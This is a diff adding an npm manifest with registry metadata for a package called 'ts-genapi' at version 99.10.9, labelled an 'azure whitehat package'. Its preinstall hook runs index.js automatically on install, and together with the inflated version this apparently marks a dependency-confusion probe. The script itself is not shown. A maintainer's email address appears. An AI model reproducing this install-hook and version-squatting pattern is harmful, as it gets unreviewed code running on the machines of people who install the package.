@@ -1,0 +1,39 @@
+{
+    "name": "ts-genapi",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "ts-genapi@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-n0UMIxux8qaD7BNxBVlfnKFc0VYMTNnW9v05omnXYYfYXnjcvF5XQhy914LqnVCwqTXBFABslrcfsjqdsDAl7g==",
+        "shasum": "5cd6f5e3f6106eeb264064f0c0d54873f177fa85",
+        "tarball": "https://registry.npmjs.org/ts-genapi/-/ts-genapi-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3573,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRJNCRA9TVsSAnZWagAABn8P/ipmXcWnXMoov1/GKAVX\neTmmiam2MaFQBMjExvG6GTXCFuIPj7JeMBCZHdxRrCZyhEkVr9/aruzDHW+M\nZfQaXHQXxFQwtYROwETWQdY/DHNg+PYUNuKrR/dj0Alwe9FhMLihhSqdhMLC\n3IqK4LZ9+tsyv6AES811v5NyWwprFt1kz4ZWxHs2NIqmWqKR4HBcpP+pBItq\nQ5ZIKJdKcTpVNjjInwLCPManaxUw5TPKrcKw36d1BzKMlMYVD02+I3BN5f4i\nDm1no6I9FXSVJv9SATP44FUzaGkQawu2wibyq+toKfaWXR5r1Wl3CxXNFchS\n/elKu32uDDnjFcZ1/m8XqHBNrVdUDBziZ6MjYPEzhCIVTYXVfqpf/warTTnm\nKz0kuppvmDgadsQMm69eb3+Sa5NLt5gn8yEqnFSSX+4U47l7iaqQZUEDVJ73\nz5bPKlrv25K4X4k2cN7icEaWrRZeAMZOeWZOUB2wmWW2dkWlrMLLpdjVYHq/\nLqi+dP9QFJ6jRf77yO5UE0l7u/K0GNFSYd5b7BlZuCD9sWtAiKpdopqO0mEU\nzwq7E4+rLAs5kWoIEZ3Hs/ENkAliJ8yhI8wougRGs5Rl6g5pOeXxmJnFFoLq\nojrfta+rbAkRoZD/hBQ0A+/h9O3SC91KWx7+MSMNdNxAHlgYjf3rjU2b4ONJ\nnK9x\r\n=7NLH\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/ts-genapi_99.10.9_1637945933602_0.08512535520390219"
+    },
+    "_hasShrinkwrap": false
+}
